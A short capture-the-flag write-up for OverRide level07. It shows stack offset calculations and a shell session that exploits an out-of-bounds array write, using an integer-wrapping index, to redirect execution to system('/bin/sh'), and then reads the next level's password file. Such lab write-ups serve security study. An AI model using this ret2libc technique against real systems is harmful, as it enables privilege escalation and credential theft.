# Level07


# Explanation


sytem	f7e6aed0	4159090384
“/bin/sh” 	F7F897EC	4160264172


```
esp : 4294956336
ebp : 4294956824

stack frame : 488 bytes

int[] a 36 bytes de esp

+ 100 cases * 4 = 436

reste 52 bytes --> 13 * 4

index 113 : ebp

return address = ebp + 4 bytes --> index 114
```
## Exploit 

```
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
```